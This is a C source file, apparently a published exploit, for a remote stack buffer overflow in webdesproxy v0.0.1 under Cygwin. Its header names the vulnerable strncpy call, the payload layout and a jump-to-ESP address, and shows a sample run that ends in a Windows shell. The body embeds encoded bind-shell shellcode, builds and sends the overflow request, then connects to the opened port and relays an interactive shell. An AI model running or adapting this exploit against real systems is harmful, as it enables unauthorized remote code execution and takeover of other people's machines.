/*[ webdesproxy[v0.0.1]: (cygwin) remote buffer overflow exploit. ]*
  *                                                                *
  * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
  *                                                                *
  * compile:                                                       *
  *  gcc xwdp-cygwin.c -o xwdp-cygwin                              *
  *                                                                *
  * syntax:                                                        *
  *  ./xwdp-cygwin [-r] -h host -p port                            *
  *                                                                *
  * webdesproxy homepage/url:                                      *
  *  http://sourceforge.net/projects/webdesproxy/                  *
  *  http://webdesproxy.sourceforge.net/                           *
  *                                                                *
  * I was curious on how cygwin-related (stack) buffer overflows   *
  * behaved, so i browsed around for opensource cygwin-related     *
  * projects and this fella popped up.  not overly popular, but    *
  * good for learning/exploration.  one interesting note is it is  *
  * easy to make universal cygwin exploits as cygwin1.dll is       *
  * usually included with the program, making for possible static  *
  * jmp/call addresses no matter the windows (SP/Lang) version.    *
  * (excluding 64bit)                                              *
  *                                                                *
  * Also, webdesproxy fork()s all of its subprocesses, so it       *
  * doesn't matter if it faults the first time.                    *
  *                                                                *
  * bug:                                                           *
  *  webdesproxy.c:111:strncpy(mb,myp,mypend-myp);                 *
  *                                                                *
  * exploitation method:                                           *
  *  "GET http://[NOPx250][JMP4][EIP/"CALL ESP"][NOPx32][SC]/\n\n" *
  *                                                                *
  * To find the address needed for the EIP overwrite, use          *
  * findjmp.exe(the defined/default address should work out of the *
  * box as the .dll is included with the program):                 *
  * -------------------------------------------------------------- *
  *  C:\webdesproxy>findjmp.exe cygwin1.dll esp                    *
  *  Reg: esp                                                      *
  *  Scanning cygwin1.dll for code usable with the esp register    *
  *  0x61048690      push esp - ret                                *
  *  0x6104936D      jmp esp                                       *
  *  0x6112C494      push esp - ret                                *
  *  Finished Scanning cygwin1.dll for code usable with the esp r$ *
  *  Found 3 usable addresses                                      *
  *                                                                *
  * example usage:                                                 *
  * -------------------------------------------------------------- *
  *  [v9@fhalo v9]$ ./xwdp-cygwin -h desktop.fakehalo.lan -p 1111  *
  *  [*] webdesproxy[v0.0.1]: (cygwin) remote buffer overflow exp$ *
  *  [*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)          *
  *                                                                *
  *  [*] target: desktop.fakehalo.lan:1111                         *
  *  [*] return address($eip/"CALL ESP"): 0x6104936d               *
  *  [*] attempting to connect: desktop.fakehalo.lan:1111.         *
  *  [*] successfully connected: desktop.fakehalo.lan:1111.        *
  *  [*] sending string:                                           *
  *  [+]  "GET http://[NOPSx250][JMP4][EIP/"CALL ESP"][NOPSx32][S$ *
  *  [*] closing connection.                                       *
  *                                                                *
  *  [*] attempting to connect: desktop.fakehalo.lan:7979.         *
  *  [*] successfully connected: desktop.fakehalo.lan:7979.        *
  *                                                                *
  *  Microsoft Windows XP [Version 5.1.2600]                       *
  *  (C) Copyright 1985-2001 Microsoft Corp.                       *
  *                                                                *
  *  C:\cygwin>                                                    *
  ******************************************************************/
#include <stdio.h>
#include <stdlib.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <getopt.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFSIZE 1024
#define TIMEOUT 10
#define SPORT 7979

/* (WinXP home SP2.  cygwin1.dll is included, so it should match */
/* no matter what.  if not, run findjmp.exe on a used dll...) */
/* findjmp.exe cygwin1.dll esp */
/* ...                         */
/* 0x6104936D      jmp esp     */
/* ...                         */
#define DFL_RETADDR 0x6104936D

/* globals. */

/* win32_bind - EXITFUNC=thread LPORT=7979 Size=344 */
/* Encoder=PexFnstenvSub http://metasploit.com      */
static char x86_bind[]=
 "\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x4b"
 "\x76\x8d\x13\x83\xeb\xfc\xe2\xf4\xb7\x1c\x66\x5e\xa3\x8f\x72\xec"
 "\xb4\x16\x06\x7f\x6f\x52\x06\x56\x77\xfd\xf1\x16\x33\x77\x62\x98"
 "\x04\x6e\x06\x4c\x6b\x77\x66\x5a\xc0\x42\x06\x12\xa5\x47\x4d\x8a"
 "\xe7\xf2\x4d\x67\x4c\xb7\x47\x1e\x4a\xb4\x66\xe7\x70\x22\xa9\x3b"
 "\x3e\x93\x06\x4c\x6f\x77\x66\x75\xc0\x7a\xc6\x98\x14\x6a\x8c\xf8"
 "\x48\x5a\x06\x9a\x27\x52\x91\x72\x88\x47\x56\x77\xc0\x35\xbd\x98"
 "\x0b\x7a\x06\x63\x57\xdb\x06\x53\x43\x28\xe5\x9d\x05\x78\x61\x43"
 "\xb4\xa0\xeb\x40\x2d\x1e\xbe\x21\x23\x01\xfe\x21\x14\x22\x72\xc3"
 "\x23\xbd\x60\xef\x70\x26\x72\xc5\x14\xff\x68\x75\xca\x9b\x85\x11"
 "\x1e\x1c\x8f\xec\x9b\x1e\x54\x1a\xbe\xdb\xda\xec\x9d\x25\xde\x40"
 "\x18\x25\xce\x40\x08\x25\x72\xc3\x2d\x1e\x92\x38\x2d\x25\x04\xf2"
 "\xde\x1e\x29\x09\x3b\xb1\xda\xec\x9d\x1c\x9d\x42\x1e\x89\x5d\x7b"
 "\xef\xdb\xa3\xfa\x1c\x89\x5b\x40\x1e\x89\x5d\x7b\xae\x3f\x0b\x5a"
 "\x1c\x89\x5b\x43\x1f\x22\xd8\xec\x9b\xe5\xe5\xf4\x32\xb0\xf4\x44"
 "\xb4\xa0\xd8\xec\x9b\x10\xe7\x77\x2d\x1e\xee\x7e\xc2\x93\xe7\x43"
 "\x12\x5f\x41\x9a\xac\x1c\xc9\x9a\xa9\x47\x4d\xe0\xe1\x88\xcf\x3e"
 "\xb5\x34\xa1\x80\xc6\x0c\xb5\xb8\xe0\xdd\xe5\x61\xb5\xc5\x9b\xec"
 "\x3e\x32\x72\xc5\x10\x21\xdf\x42\x1a\x27\xe7\x12\x1a\x27\xd8\x42"
 "\xb4\xa6\xe5\xbe\x92\x73\x43\x40\xb4\xa0\xe7\xec\xb4\x41\x72\xc3"
 "\xc0\x21\x71\x90\x8f\x12\x72\xc5\x19\x89\x5d\x7b\xa4\xb8\x6d\x73"
 "\x18\x89\x5b\xec\x9b\x76\x8d\x13";

struct{
 unsigned int addr;
 char *host;
 unsigned short port;
}tbl;

/* lonely extern. */
extern char *optarg;

/* functions. */
char *getbuf(unsigned int);
unsigned short proxy_connect(char *,unsigned short);
signed int getshell_conn(char *,unsigned short);
void proc_shell(signed int);
void printe(char *,short);
void usage(char *);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* start. */
int main(int argc,char **argv){
 signed int chr=0,rsock=0;

 printf("[*] webdesproxy[v0.0.1]: (cygwin) remote buffer overflo"
 "w exploit.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)"
 "\n\n");

 tbl.addr=DFL_RETADDR;

 while((chr=getopt(argc,argv,"h:p:r:"))!=EOF){
  switch(chr){
   case 'h':
    if(!tbl.host&&!(tbl.host=(char *)strdup(optarg)))
     printe("main(): allocating memory failed",1);  
    break;
   case 'p':
    tbl.port=atoi(optarg);
    break;
   case 'r':
    sscanf(optarg,"%x",&tbl.addr);
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!tbl.host||!tbl.port)usage(argv[0]);

 printf("[*] target: %s:%d\n",tbl.host,tbl.port);
 printf("[*] return address($eip/\"CALL ESP\"): 0x%.8x\n",tbl.addr);

 proxy_connect(tbl.host,tbl.port);
 rsock=getshell_conn(tbl.host,SPORT);
 if(rsock>0)proc_shell(rsock);
 exit(0);
}

/* make buf: */
/* "GET http://[NOPSx250][JMP4][EIP/"CALL ESP"][NOPSx32][SHELLCODE]/\n\n" */
char *getbuf(unsigned int addr){
 char *buf;
 if(!(buf=(char *)malloc(BUFSIZE+1)))
  printe("getbuf(): allocating memory failed.",1);
 memset(buf,0,BUFSIZE);
 memcpy(buf,"GET http://",11);
 memset(buf+11,'\x90',250); /* filler/safe spot */
 buf[11+250]=0xeb; /* jmp */
 buf[11+250+1]=0x04; /* 4 bytes */
 *(long *)&buf[11+250+2]=addr; /* new eip, points to call esp. */
 memset(buf+11+250+4+2,'\x90',32); /* safe spot...just to be safe. */
 memcpy(buf+11+250+4+2+32,x86_bind,strlen(x86_bind));
 memset(buf+11+250+4+2+32+strlen(x86_bind),'/',1); /* needed to trigger */
 memset(buf+11+250+4+2+32+strlen(x86_bind)+1,'\n',2); /* \n\n */
 return(buf);
}

/* connects to the vulnerable webdexproxy server. */
unsigned short proxy_connect(char *hostname,unsigned short port){
 signed int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname)))
   printe("couldn't resolve hostname.",1);
  memcpy((char *)&s.sin_addr,(char *)t->h_addr,sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("webdesproxy connection failed.",1);
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n",hostname,port);
 sleep(1);
 printf("[*] sending string:\n");
 printf("[+]  \"GET http://[NOPSx250][JMP4][EIP/\"CALL ESP\"][NOPSx32]"
 "[SHELLCODE]/\\n\\n\"\n");
 write(sock,getbuf(tbl.addr),BUFSIZE);
 sleep(1);
 printf("[*] closing connection.\n\n");
 close(sock);
 return(0);
}

/* connects to bindshell. */
signed int getshell_conn(char *hostname,unsigned short port){
 signed int sock=0;
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe("getshell_conn(): socket() failed.",1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname)))
   printe("getshell_conn(): couldn't resolve.",1);
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",hostname,port);
  exit(1);
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n\n",hostname,port);
 return(sock);
}

/* process the bind/connect-back shell. */
void proc_shell(signed int sock){
 signed int r=0;
 char buf[4096+1];
 fd_set fds;
 signal(SIGINT,SIG_IGN);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1)
   printe("getshell(): select() failed.",1);
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,4096))<1)
    printe("getshell(): read() failed.",1);
   if(write(sock,buf,r)!=r)
    printe("getshell(): write() failed.",1);
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,4096))<1)exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}

/* error! */
void printe(char *err,short e){
 printf("[!] %s\n",err);
 if(e)exit(1);
 return;
}

/* usage. */
void usage(char *progname){
 printf("syntax: %s [-r] -h host -p port\n\n",progname);
 printf("  -h <host/ip>\ttarget hostname/ip.\n");
 printf("  -p <port>\ttarget port.\n");
 printf("  -r <addr>\tdefine return/\"CALL ESP\" address. (0x%.8x)\n\n",tbl.addr);
 exit(0);
}